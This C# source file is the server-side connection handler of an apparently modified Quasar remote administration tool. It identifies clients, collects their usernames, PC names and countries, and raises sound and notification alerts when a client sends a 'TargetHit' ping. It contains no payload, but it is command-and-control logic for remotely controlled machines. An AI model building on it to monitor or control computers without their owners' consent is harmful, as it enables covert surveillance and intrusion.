using Quasar.Common.Cryptography;
using Quasar.Common.Messages;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Media;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Windows.Forms;

namespace Quasar.Server.Networking
{
    public class QuasarServer : Server
    {
        [DllImport("winmm.dll", CharSet = CharSet.Auto)]
        private static extern int mciSendString(string command, StringBuilder returnValue, int returnLength, IntPtr winHandle);

        private readonly Utilities.ClientDatabase _clientDb = new Utilities.ClientDatabase();

        private readonly object _targetHitConnectLock = new object();
        // When a TargetHit ping is received while the client is not identified yet,
        // we allow one-time identification even if AcceptPing is disabled for that UUID.
        private readonly HashSet<string> _targetHitAllowIdentificationUuids =
            new HashSet<string>(StringComparer.OrdinalIgnoreCase);
        // If AcceptPing is disabled, we still want to connect the client UI immediately on the first TargetHit,
        // but avoid re-connecting / re-showing popups for every subsequent TargetHit ping.
        private readonly HashSet<string> _targetHitConnectedUuids =
            new HashSet<string>(StringComparer.OrdinalIgnoreCase);

        /// <summary>
        /// Gets the clients currently connected and identified to the server.
        /// </summary>
        public Client[] ConnectedClients
        {
            get { return Clients.Where(c => c != null && c.Identified).ToArray(); }
        }

        /// <summary>
        /// Occurs when a client connected.
        /// </summary>
        public event ClientConnectedEventHandler ClientConnected;

        /// <summary>
        /// Represents the method that will handle the connected client.
        /// </summary>
        /// <param name="client">The connected client.</param>
        public delegate void ClientConnectedEventHandler(Client client);

        /// <summary>
        /// Fires an event that informs subscribers that the client is connected.
        /// </summary>
        /// <param name="client">The connected client.</param>
        private void OnClientConnected(Client client)
        {
            if (ProcessingDisconnect || !Listening) return;
            var handler = ClientConnected;
            handler?.Invoke(client);
        }

        /// <summary>
        /// Occurs when a client disconnected.
        /// </summary>
        public event ClientDisconnectedEventHandler ClientDisconnected;

        /// <summary>
        /// Represents the method that will handle the disconnected client.
        /// </summary>
        /// <param name="client">The disconnected client.</param>
        public delegate void ClientDisconnectedEventHandler(Client client);

        /// <summary>
        /// Fires an event that informs subscribers that the client is disconnected.
        /// </summary>
        /// <param name="client">The disconnected client.</param>
        private void OnClientDisconnected(Client client)
        {
            if (ProcessingDisconnect || !Listening) return;
            var handler = ClientDisconnected;
            handler?.Invoke(client);
        }

        private void MarkTargetHitAllowIdentification(string uuid)
        {
            if (string.IsNullOrWhiteSpace(uuid)) return;
            lock (_targetHitConnectLock)
            {
                _targetHitAllowIdentificationUuids.Add(uuid.Trim());
            }
        }

        private bool TryConsumeTargetHitAllowIdentification(string uuid)
        {
            if (string.IsNullOrWhiteSpace(uuid)) return false;
            lock (_targetHitConnectLock)
            {
                return _targetHitAllowIdentificationUuids.Remove(uuid.Trim());
            }
        }

        private bool HasTargetHitAllowIdentification(string uuid)
        {
            if (string.IsNullOrWhiteSpace(uuid)) return false;
            lock (_targetHitConnectLock)
            {
                return _targetHitAllowIdentificationUuids.Contains(uuid.Trim());
            }
        }

        private void MarkTargetHitConnected(string uuid)
        {
            if (string.IsNullOrWhiteSpace(uuid)) return;
            lock (_targetHitConnectLock)
            {
                _targetHitConnectedUuids.Add(uuid.Trim());
            }
        }

        private bool IsTargetHitConnectedAlready(string uuid)
        {
            if (string.IsNullOrWhiteSpace(uuid)) return false;
            lock (_targetHitConnectLock)
            {
                return _targetHitConnectedUuids.Contains(uuid.Trim());
            }
        }

        private void ClearTargetHitConnectionState(string uuid)
        {
            if (string.IsNullOrWhiteSpace(uuid)) return;
            lock (_targetHitConnectLock)
            {
                _targetHitAllowIdentificationUuids.Remove(uuid.Trim());
                _targetHitConnectedUuids.Remove(uuid.Trim());
            }
        }

        /// <summary>
        /// Constructor, initializes required objects and subscribes to events of the server.
        /// </summary>
        /// <param name="serverCertificate">The server certificate.</param>
        public QuasarServer(X509Certificate2 serverCertificate) : base(serverCertificate)
        {
            base.ClientState += OnClientState;
            base.ClientRead += OnClientRead;
            _clientDb.Initialize();
        }

        /// <summary>
        /// Decides if the client connected or disconnected.
        /// </summary>
        /// <param name="server">The server the client is connected to.</param>
        /// <param name="client">The client which changed its state.</param>
        /// <param name="connected">True if the client connected, false if disconnected.</param>
        private void OnClientState(Server server, Client client, bool connected)
        {
            if (!connected)
            {
                ClearTargetHitConnectionState(client.Value?.Id);
                if (client.Identified)
                    OnClientDisconnected(client);
            }
        }

        /// <summary>
        /// Forwards received messages from the client to the MessageHandler.
        /// </summary>
        /// <param name="server">The server the client is connected to.</param>
        /// <param name="client">The client which has received the message.</param>
        /// <param name="message">The received message.</param>
        private void OnClientRead(Server server, Client client, IMessage message)
        {
            if (!client.Identified)
            {
                if (message is ClientPingRequest ping)
                {
                    string uuid = ping.Uuid ?? "";
                    if (string.IsNullOrWhiteSpace(uuid))
                    {
                        client.Send(new ClientIdentificationResult { Result = false });
                        client.Disconnect();
                        return;
                    }

                    // Make sure downstream processors (toast/DB) can associate this ping to the UUID.
                    client.Value.Id = uuid;

                    bool accept = _clientDb.GetClientAcceptPing(uuid);
                    // Fresh deployments may not have a DB row yet for this UUID.
                    // Allow the very first ping so the client can identify and get a row created.
                    if (!accept && !_clientDb.ClientExists(uuid))
                        accept = true;

                    if (ping.TargetHit)
                    {
                        // Target-hit should override AcceptPing: allow identification & connect UI immediately.
                        accept = true;
                        MarkTargetHitAllowIdentification(uuid);
                        accept = HandleTargetHitPrompt(uuid, ping, accept);
                    }

                    // Update UI/DB (toast + LastPing) and show notification even when checkbox is not enabled.
                    MessageHandler.Process(client, message);

                    client.Send(new ClientIdentificationResult { Result = accept }); // respond to ping handshake
                    if (!accept)
                        client.Disconnect();
                    return;
                }

                if (message.GetType() == typeof (ClientIdentification))
                {
                    client.Identified = IdentifyClient(client, (ClientIdentification) message);
                    if (client.Identified)
                    {
                        client.Send(new ClientIdentificationResult {Result = true}); // finish handshake
                        /* Only show as connected in UI when Accept Ping is enabled.
                         * If disabled, we still allow identification so we can receive periodic pings (and show toast),
                         * but we won't consider the client "connected" for control actions. */
                        string identifiedUuid = client.Value?.Id;
                        bool acceptPing = _clientDb.GetClientAcceptPing(identifiedUuid);
                        bool isNewClient = !string.IsNullOrWhiteSpace(identifiedUuid) && !_clientDb.ClientExists(identifiedUuid);
                        bool forcedByTargetHit = TryConsumeTargetHitAllowIdentification(identifiedUuid);

                        if (acceptPing || isNewClient)
                        {
                            OnClientConnected(client);
                        }
                        else if (forcedByTargetHit && !IsTargetHitConnectedAlready(identifiedUuid))
                        {
                            MarkTargetHitConnected(identifiedUuid);
                            OnClientConnected(client);
                        }
                    }
                    else
                    {
                        /* Identification can fail for expected reasons (e.g. Accept Ping not enabled for that UUID).
                         * Disconnect silently to avoid spamming the operator. */
                        client.Disconnect();
                    }
                }
                else
                {
                    MessageBox.Show(
                        string.Format("Unexpected message type from unidentified client: {0}. Disconnecting.", message?.GetType().Name ?? "null"),
                        "Viewer - Protocol Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    client.Disconnect();
                }
                return;
            }

            MessageHandler.Process(client, message);

            if (message is ClientPingRequest pingConnected && pingConnected.TargetHit)
            {
                string uuid = pingConnected.Uuid ?? client.Value?.Id;
                bool acceptPing = _clientDb.GetClientAcceptPing(uuid);
                if (!acceptPing && !IsTargetHitConnectedAlready(uuid))
                {
                    MarkTargetHitConnected(uuid);
                    OnClientConnected(client);
                }

                HandleTargetHitPrompt(uuid, pingConnected, acceptPing);
            }
        }

        private bool IdentifyClient(Client client, ClientIdentification packet)
        {
            if (string.IsNullOrWhiteSpace(packet.Id))
                return false;

            /* Support both legacy auto-generated 64-char IDs and user-provided GUID-style 36-char IDs. */
            if (packet.Id.Length != 64 && packet.Id.Length != 36)
                return false;

            /* Only identify if "Accept Ping" is enabled for this UUID.
             * Exception: if a TargetHit ping was received, allow one-time identification even when AcceptPing is disabled. */
            if (!_clientDb.GetClientAcceptPing(packet.Id))
            {
                bool exists = _clientDb.ClientExists(packet.Id);
                if (exists && !HasTargetHitAllowIdentification(packet.Id))
                    return false;
            }

            client.Value.Version = packet.Version;
            client.Value.OperatingSystem = packet.OperatingSystem;
            client.Value.AccountType = packet.AccountType;
            client.Value.Country = packet.Country;
            client.Value.CountryCode = packet.CountryCode;
            client.Value.Id = packet.Id;
            client.Value.Username = packet.Username;
            client.Value.PcName = packet.PcName;
            client.Value.Tag = packet.Tag;
            client.Value.ImageIndex = packet.ImageIndex;
            client.Value.EncryptionKey = packet.EncryptionKey;

            // TODO: Refactor tooltip
            //if (Settings.ShowToolTip)
            //    client.Send(new GetSystemInfo());

#if !DEBUG
            try
            {
                var csp = (RSACryptoServiceProvider)ServerCertificate.PublicKey.Key;
                return csp.VerifyHash(Sha256.ComputeHash(Encoding.UTF8.GetBytes(packet.EncryptionKey)),
                    CryptoConfig.MapNameToOID("SHA256"), packet.Signature);
            }
            catch (Exception)
            {
                return false;
            }
#else
            return true;
#endif
        }

        private void PlayTargetHitTagSound(string uuid)
        {
            try
            {
                if (string.IsNullOrWhiteSpace(uuid)) return;
                string tagName = _clientDb.GetClientTag(uuid);
                if (string.IsNullOrWhiteSpace(tagName)) return;
                var tag = _clientDb.GetTag(tagName);
                string soundPath = tag?.Sound ?? "";
                if (string.IsNullOrWhiteSpace(soundPath)) return;

                string resolved = soundPath;
                if (!Path.IsPathRooted(resolved))
                    resolved = Path.Combine(Application.StartupPath, resolved);
                if (!File.Exists(resolved)) return;
                string ext = Path.GetExtension(resolved)?.ToLowerInvariant() ?? "";
                if (ext == ".wav")
                {
                    var player = new SoundPlayer(resolved);
                    player.Play();
                    return;
                }

                // Support mp3 and other MCI-compatible formats.
                string alias = "taghit_" + Guid.NewGuid().ToString("N");
                string safePath = resolved.Replace("\"", "\"\"");
                mciSendString($"open \"{safePath}\" type mpegvideo alias {alias}", null, 0, IntPtr.Zero);
                mciSendString($"play {alias}", null, 0, IntPtr.Zero);
            }
            catch
            {
                // Best-effort only.
            }
        }

        private bool HandleTargetHitPrompt(string uuid, ClientPingRequest ping, bool accept)
        {
            PlayTargetHitTagSound(uuid);
            /* Target-hit details are shown via tray balloon; Hit column shows Pending (see FrmMain.SetPingByClient). */
            return accept;
        }
    }
}
